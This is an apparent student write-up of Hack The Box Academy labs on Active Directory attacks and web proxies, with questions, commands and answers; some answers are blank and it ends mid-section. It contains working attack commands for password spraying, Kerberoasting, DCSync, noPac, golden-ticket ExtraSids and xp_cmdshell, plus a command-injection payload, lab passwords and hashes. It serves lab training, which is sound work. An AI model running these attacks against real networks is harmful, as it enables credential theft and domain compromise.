**Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?**

```
sudo git clone https://github.com/ropnop/kerbrute.git

# Typing make help will show us the compiling options available.
cd kerbrute
make help

# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).
sudo make all

# The newly created dist directory will contain our compiled binaries.
ls -la dist

cd dist
python3 -m http.server 8001

# Connec to the pivot host
ssh htb-student@$ip
wget http://$ipAttacker:8001 kerbrute_linux_amd64 

# Also download the jsmith.txt from https://github.com/insidetrust/statistically-likely-usernames/tree/master 

# Run kerbrute from the pivot host
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

```

Results: 56 


### Spray Responsibly

**Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.**

```
./kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

./kerbrute_linux_386 passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
```

Results: sgage

**RDP to $ip (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.**

```
# Open powershell as Admin
Import-Module .\DomainPasswordSpray.ps1 

Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue 

```

Results: dbranch



### Deeper Down the Rabbit Hole


**What AD User has a RID equal to Decimal 1170?**

```
ssh htb-student@$ip
rpcclient -U forend 172.16.5.5
# Enter password when prompted

# In the console of developer tools:
number=1170; number.toString(16);
# We obtain 457 as the hex value for that user RID

queryuser 0x457
```

Results: mmorgan


**What is the membercount: of the "Interns" group?**

```
# Connect to the machine via ssh
ssh htb-student@$ip

# ping sweet the network from than machine
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# After determining the target 172.16.5.5, we can enumerate groups with provided creds, and filter by "Interns"
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep Interns
```

Results: 10


RDP to 10.129.147.147 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". **Using Bloodhound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer)**

[For installing and using bloodhound](bloodhound.md).

![Bloodhound](img/blood.png)

Results: 13


**What PowerView function allows us to test if a user has administrative access to a local or remote host?**

Results: Test-AdminAccess



**Run Snaffler and hunt for a readable web config file. What is the name of the user in the connection string within the file?**

Results: sa


**What is the password for the database user?**

Results: ILFREIGHTDB01!


**RDP to 10.129.147.147 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". Enumerate the host's security configuration information and provide its AMProductVersion.**

```
# To RDP 
xfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution

# Get the current Defender status.
Get-MpComputerStatus
```

Results: 4.18.2109.6  


What domain user is explicitly listed as a member of the local Administrators group on the target host?

```
# To RDP 
xfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution

# Get members of Local Administrators group
net localgroup Administrators

# In the results you will see:
Members                                                                    -----------------------------------                                        Administrator
INLANEFREIGHT\adunn
INLANEFREIGHT\Domain Admins
INLANEFREIGHT\Domain Users
The command completed successfully.
```

Results: adunn


**Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.**

```
# To RDP 
xfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution

##########
# With Get-AD 
##########
# Lists disabled users with LDAP and returns their samAccountName
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select samaccountname

# Gets details about one of the users obtained
Get-ADUser -Identity bross -Properties * 
# Flag will be in the description field

#########
# With dsquery
#########
# Lists disabled users with LDAP and returns their samAccountName
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr SamAccountName    

# Gets details about one of the users obtained
net user bross /domain 
```

Results: HTB{LD@P_I$_W1ld}


### Cooking with Fire

**SSH to $ip (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!". Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.**

```
# Connect via ssh
ssh htb-student@$ip

# Enumerate the network
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# Enumerate SPNs in the Domain and we will see SAPService among them
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
# When prompted for the password, enter Klmcargo2

# Generate TGD ticket for the SAPService account
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile ker

# Copy the ker file content to our kali attacker machine and crack it
hashcat -m 13100 ker /usr/share/wordlists/rockyou.txt

```

Results: !SapperFi2


**What powerful local group on the Domain Controller is the SAPService user a member of?**

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
# When prompted for the password, enter Klmcargo2. You will also obtain the groups that the user belongs to.
```

Results: Account Operators



**What is the name of the service account with the SPN 'vmware/inlanefreight.local'?**

```
# Connect via rdp
xfreerdp /v:$ip /u:$user /cert:ignore

# List SPNs
setspn.exe -Q */*
# And pay attention to the firsts in the list:
# CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
# vmware/inlanefreight.local  
```

Results: svc_vmwaresso


**Crack the password for this account and submit it as your answer.**

```
# Connect via rdp
xfreerdp /v:$ip /u:$user /cert:ignore

# Go to tools
cd C:\Tools

# Import PowerView
Import-module .\PowerView.ps1

# List SPNs and returns their SamAccountName
Get-DomainUser * -spn | select samaccountname 

#  Generate a TGS ticker for a specific user:
Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat

# After copying the ticket to the kali machine and removing blank spaces, crack it with hashcat
cat rc4_to_crack | tr -d \\n > hash.txt
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

Results: Virtual01

### An ACE in the Hole


**What type of ACL defines which security principals are granted or denied access to an object? (one word)**
Results: DACL


**Which ACE entry can be leveraged to perform a targeted Kerberoasting attack?**
Results: GenericAll 


**What is the rights GUID for User-Force-Change-Password?**
Results:


**What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?**
Results: ResolveGUIDs


What privileges does the user damundsen have over the Help Desk Level 1 group?

```
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -Identity "Help Desk Level 1" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```
This can also be done with other tools such as Bloodhound, installed under C:\Tools.
Results: GenericWrite


**Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne).**

```
$sid = Convert-NameToSid forend

Get-DomainObjectACL -Identity "dpayne" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```
This can also be done with other tools such as Bloodhound, installed under C:\Tools.
Results: GenericAll



**What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)**

```
$sid = Convert-NameToSid forend

Get-DomainObjectACL -Identity "GPO Management" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```

Results: Self-Membership


**Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.**


![](img/dacl01.png)


```powershell
##########
# 1. Abuse ForceChangePassword: take over account damundsen
#########

# Wley will change the password of damundsen. First, open Powershell as Wley
# Creating a PSCredential Object
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```


![](img/dacl.png)

Our user damundsen has GenericWrite privileges over the `Help Desk Level 1` group. This means, among other things, that the attacker can add a user/group/computer to a group.

```powershell
##########
# 2. Abuse GenericWrite: add damundsen to group 'Help Desk Level 1'
#########
# Open powershell as damundsen
# Creating a SecureString Object using damundsen
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 

# Add damundsen to the group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
	
# Confirming damundsen was Added to the Group
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName


##########
# 3. Abuse GenericAll: Perform a kerberoasting attack
#########
# Members of the `Information Technology` group have `GenericAll` rights over the user `adunn`, which means we could perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak
# Open powershell as damundsen
# Creating a SecureString Object using damundsen
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 

# Creating a Fake SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

#  Kerberoasting with Rubeus
.\Rubeus.exe kerberoast /user:adunn /nowrap

# Crack it
hashcat -m 13100 $filename /usr/share/wordlists/rockyou.txt
```

Results: SyncMaster757

**Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.**

```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
Results: syncron

**What is this user's cleartext password?**
Results: Mycleart3xtP@ss!

 **Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.**

```
# Open cmd 
runas /netonly /user:INLANEFREIGHT\adunn powershell
# When prompted, enter password 'SyncMaster757'

cd C:\Tools\mimikatz\x64
.\mimikatz.exe

lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield
```

Results: 4bb3b317845f0954200a6b0acc9b9f9a


### Stacking The Deck

**RDP to 10.129.230.228 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". What other user in the domain has CanPSRemote rights to a host?**

```cypher
# Open Bloodhound
# In Analysis tab, create a custom query and call it "Find WinRM users":
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

Results: bdavis


**What host can this user access via WinRM? (just the computer name)**
Results: ACADEMY-EA-DC01



**Authenticate to ACADEMY-EA-DB01 with user "damundsen" and password "SQL1234!". Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.**

```powershell
ssh htb-student@172.16.5.225
 
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

enable_xp_cmdshell
xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt

```

Results: 1m_the_sQl_@dm1n_n0w!


**Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)**

Results: 2021-42278&2021-42287


**Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.**

```
# Add this line to the proxychains file /etc/proxychains
socks5 127.0.0.1 1234

# Establish a tunnel connection
ssh htb-student@$ip -D 1234

# Now from my attacker machine, test the NoPac vulnerability. First we will run an scanner from the host machine:
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

It will return: 

```bash
# it will save the file administrator_ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.ccache
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
 ```

We could then use the cache file to perform a pass-the-ticket and perform further attacks such as DCSync.  Using noPac to DCSync the Built-in Administrator Account:

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

It will return:

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
```

whereas the NTLM hash is 88ad09182de639ccc6579eb0849751cf. Now we can use crackmapexec (for instance):

```
proxychains crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf  -x 'type C:\Users\Administrator\Desktop\DailyTasks\flag.txt' --exec-method smbexec
```

Results: D0ntSl@ckonN0P@c!


**RDP to  (ACADEMY-EA-MS01) ,10.129.32.8 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "Academy_student_AD!". Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".**

```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

Results: ygroce


 **Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.**

```
# Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.
.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat

# Cracking the Hash Offline with Hashcat:
hashcat -m 18200 ygroce /usr/share/wordlists/rockyou.txt
```

Results: Pass@word

### Why So Trusting?

**RDP to  with user "htb-student" and password "Academy_student_AD!". What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)**

```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```

Results: LOGISTICS.INLANEFREIGHT.LOCAL,

**What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?**

```powershell
# Same as above
Import-Module activedirectory
Get-ADTrust -Filter *
```

Results: FREIGHTLOGISTICS.LOCAL

**What direction is this trust?**

Results: Bidirectional


**RDP to  with user "htb-student_adm" and password "HTB_@cademy_stdnt_admin!". What is the SID of the child domain?**

```powershell
# As we are already in the child domain:
Import-Module .\PowerView.ps1
Get-DomainSID
```

Results: S-1-5-21-2806153819-209893948-922872689


 **What is the SID of the Enterprise Admins group in the root domain?**

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

```

Results: S-1-5-21-3842939050-3880317879-2865463114-519


**Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.**

```
# The complete attack would require getting the golden tickets.
# Step 1: get SID of the Child domain
Import-Module .\PowerView.ps1
Get-DomainSID
# Result: S-1-5-21-2806153819-209893948-922872689


# Step 2: get  KRBTGT hash for the child domain
# Go to mimikatz.exe file in the explorer and execute as admin
lsadump::dcsync /user:$domain\$user
# Result:  `9d765b482771505cbe97411065964d5f`.

# Step 3: getting the name of a target user in the child domain (does not need to exist!)
# Result: hacker

# Step 4: getting the FQDN of the child domain. 
# Listed above in mimikatz output
# Result:  `LOGISTICS.INLANEFREIGHT.LOCAL`

# Step 5: getting the SID of the Enterprise Admins group of the root domain
# Way #1:
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
# Way #2:
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
# Result:  `S-1-5-21-3842939050-3880317879-2865463114-519`

# Step 6: the attack
# Generate a golden ticket:
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
# Read the flag (make sure that the ticket has been created with klist)
cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
```

Results: f@ll1ng_l1k3_d0m1no3$


**SSH to with user "htb-student" and password "HTB_@cademy_stdnt!". Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.**

```
#### Step 1: getting the KRBTGT hash for the child domain
secretsdump.py $targetedDomain/$UserWithAdminPriv@$TargetedIP -just-dc-user $NetbiosNameofDomain/krbtgt

# Example:
# secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
# Enter password: HTB_@cademy_stdnt_admin!
# Results: 9d765b482771505cbe97411065964d5f
#### 

#### Step 2: getting the SID for the child domain. Obtain the SID for the domain and the RIDs for each user and group and filter out by Domain SID
lookupsid.py $targetedDomain/$UserWithAdminPriv@TargetedIP | grep "Domain SID"

# Example:
# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
# Enter password: HTB_@cademy_stdnt_admin!
# Results:  S-1-5-21-2806153819-209893948-922872689
####

#### Step 3: getting the name of a target user in the child domain (does not need to exist!)
hacker
####

#### Step 4: getting the FQDN of the child domain.
logistics.inlanefreight.local
####

#### Step 5: getting the SID of the Enterprise Admins group of the root domain
lookupsid.py $targetedDomain/$UserWithAdminPriv@$DomainControllerIP | grep "Enterprise Admins"
# Example:
# lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep "Enterprise Admins"
# Enter password: HTB_@cademy_stdnt_admin!
# Results: 519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
####

#### Step 6: Generate a golden ticket 
ticketer.py -nthash $KRBTGThashOfChildDomain -domain $targetedDomain -domain-sid $sidDomain -extra-sid $SIDofEnterpriseAdminGroup $madeupUserName
# Example:
# ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials:
[*] Saving ticket in hacker.ccache

# Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.
export KRB5CCNAME=hacker.ccache 
####

#### Step 7: Accessing another user on domain
# With one user, we will request the NTLM hash for another user
secretsdump.py $ControlledUsername@$hostnameController.$Parentdomain -k -no-pass -just-dc-ntlm -just-dc-user $targetUsername
# Example:
# secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross

```

Results: 49a074a39dd0651f647e765c2cc794c7

### Breaking Down Boundaries


**Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.**

```
#### Enumerating SPNs
Get-DomainUser -SPN -Domain $TargetDomain | select SamAccountName
# Example:
# Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
# Results: mssqlsvc
######

#### Getting which groups is mssqlsvc member of
Get-DomainUser -Domain $TargetDomain -Identity $interestingUserSamAccountName | select samaccountname,memberof
# Example:
# Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
# Results:  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
######

#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
.\Rubeus.exe kerberoast /domain:$TargetDomain /user:$interestingUserSamAccountName /nowrap
# Example: 
# .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
# Results: [the kerberos ticket]
####

#### Crack it
hashcat -m 13100 ticketTocrack /usr/share/wordlists/rockyou.txt 
```

Results: 1logistics


**Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.**

```
GetUserSPNs.py -target-domain $targetedDomain $OurDomain/$ourUserSamAccountName
# Example:
# GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
# Enter password: transporter@4
```

Results: sapsso


**Crack the TGS and submit the cleartext password as your answer.**

```
GetUserSPNs.py -request -target-domain $targetedDomain $OurDomain/$ourUserSamAccountName
# Example:
# GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
# Enter password: transporter@4

# Cracking the sapsso TGS:
hashcat -m 13100 sapsso /usr/share/wordlists/rockyou.txt  
```

Results: pabloPICASSO



**Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.**

```
evil-winrm -i 172.16.5.238 -u sapsso -p pabloPICASSO
cat c:\Users\Administrator\Desktop\flag.txt
```

Results: burn1ng_d0wn_th3_f0rest!


### AD Enumeration & Attacks - Skills Assessment Part I 

A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.

**Submit the contents of the flag.txt file on the administrator Desktop of the web server**

```
# Enter in http:\\$ip\uploads
# Enter creds
# Run in the terminal
type c:\Users\Administrator\Desktop\flag.txt
```

Results: JusT_g3tt1ng_st@rt3d!


**Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer**

```
# Enumerate SPNs with
setspn.exe -Q */*

### Results:
# CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
# MSSQLSvc/SQL01.inlanefreight.local:1433

# Also you can enumerate them by uploading the PowerView.ps1 the antak Choose File and Upload the file. In that case, the command line will be used to indicate the path. After that, you need to import-module every time you are going to use the cmdlet because the command line does not maintain the state. Everything runs in the context of the command.
cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.ps1 ; Get-DomainUser * -spn | select samaccountname
```

Results:  svc_sql


**Crack the account's password. Submit the cleartext value.**

```
# Obtain the ticket
cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt

# Copy ticket to the file sqlservice in my attacker machine and crack it:
hashcat -m 13100 sqlserver /usr/share/wordlists/rockyou.txt
```

Results: lucky7


**Submit the contents of the flag.txt file on the Administrator desktop on MS01**

```
# We upload the file Microsoft.ActiveDirectory.Management.dll from the Active Directory powershell module and now we can use it to enumerate computers
Import-Module .\Microsoft.ActiveDirectory.Management.dll; Get-ADComputer -Filter * | Select-Object Name 

# We need to concatenate commands with semi-colon. The following commands create a Secure-string object with the credential of the user svc_sql. Then we will use Invoke-Command to run a command in the remote host MS01
$password = ConvertTo-SecureString "lucky7" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\svc_sql", $password; Invoke-Command -ComputerName "MS01.INLANEFREIGHT.LOCAL" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
```

Results: spn$_r0ast1ng_on_@n_0p3n_f1re


**Find cleartext credentials for another domain user. Submit the username as your answer.**

```
# Enumerate SPNs with
setspn.exe -Q */*

# backupjob looks like a promising user. FRom the previous output we also know:
# backupjob/veam001.inlanefreight.local
Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN backupjob/veam001.inlanefreight.local -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt

sqldev
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt

sqlprod
MSSQLSvc/SQL02.inlanefreight.local:1433
Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL02.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt

Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN krbtgt/DC01.INLANEFREIGHT.LOCAL -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
	
```

Results:



**Submit this user's cleartext password.**

```

```

Results:



**What attack can this user perform?**

```

```

Results:



**Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01**

```

```

Results:



Question

```

```

Results:


## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)

### Intercepting Web Requests

Try intercepting the ping request on the server shown above, and change the post data similarly to what we did in this section. Change the command to read 'flag.txt'

```
# After intercepting the request, we enter:
POST /ping HTTP/1.1
Host: 94.237.59.24:51204
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://94.237.59.24:51204
Connection: close
Referer: http://94.237.59.24:51204/
Upgrade-Insecure-Requests: 1

ip=1;cat flag.txt
```

The response:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Sun, 20 Oct 2024 18:17:29 GMT
Connection: close
Content-Length: 282

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.030/0.030/0.030/0.000 ms
HTB{1n73rc3p73d_1n_7h3_m1ddl3}
```

Results: HTB{1n73rc3p73d_1n_7h3_m1ddl3}

### Repeating Requests

**Try using request repeating to be able to quickly test commands. With that, try looking for the other flag.**

The request:

```
POST /ping HTTP/1.1
Host: 94.237.59.24:51204
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://94.237.59.24:51204
Connection: close
Referer: http://94.237.59.24:51204/
Upgrade-Insecure-Requests: 1

ip=1;cat /flag.txt
```

The response:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Date: Sun, 20 Oct 2024 18:37:28 GMT
Connection: close
Content-Length: 283

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
HTB{qu1ckly_r3p3471n6_r3qu3575}

```


Results: HTB{qu1ckly_r3p3471n6_r3qu3575}
 
### Encoding/Decoding

Question. 



```
# The provided file contains the text:
VTJ4U1VrNUZjRlZXVkVKTFZrWkdOVk5zVW10aFZYQlZWRmh3UzFaR2NITlRiRkphWld0d1ZWUllaRXRXUm10M1UyeFNUbVZGY0ZWWGJYaExWa1V3ZVZOc1VsZGlWWEJWVjIxNFMxWkZNVFJUYkZKaFlrVndWVmR0YUV0V1JUQjNVMnhTYTJGM1BUMD0=

# It is base64 text. You need to decode in base64 4 times until getting an url encoded. First:
cat encoded_flag.txt | base64 -d | tee encoded2.txt
# U2xSUk5FcFVWVEJLVkZGNVNsUmthVXBVVFhwS1ZGcHNTbFJaZWtwVVRYZEtWRmt3U2xSTmVFcFVXbXhLVkUweVNsUldiVXBVV214S1ZFMTRTbFJhYkVwVVdtaEtWRTB3U2xSa2F3PT0=

cat encoded2.txt | base64 -d | tee encoded3.txt
# SlRRNEpUVTBKVFF5SlRkaUpUTXpKVFpsSlRZekpUTXdKVFkwSlRNeEpUWmxKVE0ySlRWbUpUWmxKVE14SlRabEpUWmhKVE0wSlRkaw==

cat encoded3.txt | base64 -d | tee encoded4.txt
# JTQ4JTU0JTQyJTdiJTMzJTZlJTYzJTMwJTY0JTMxJTZlJTM2JTVmJTZlJTMxJTZlJTZhJTM0JTdk

cat encoded4.txt | base64 -d | tee encoded5.txt
# %48%54%42%7b%33%6e%63%30%64%31%6e%36%5f%6e%31%6e%6a%34%7d

# Enter it in Decoder in Burpsuite 
HTB{3nc0d1n6_n1nj4}
```

Results: HTB{3nc0d1n6_n1nj4}

### Proxying Tools

Question. 
```
# Start metasploit
msfconsole -q

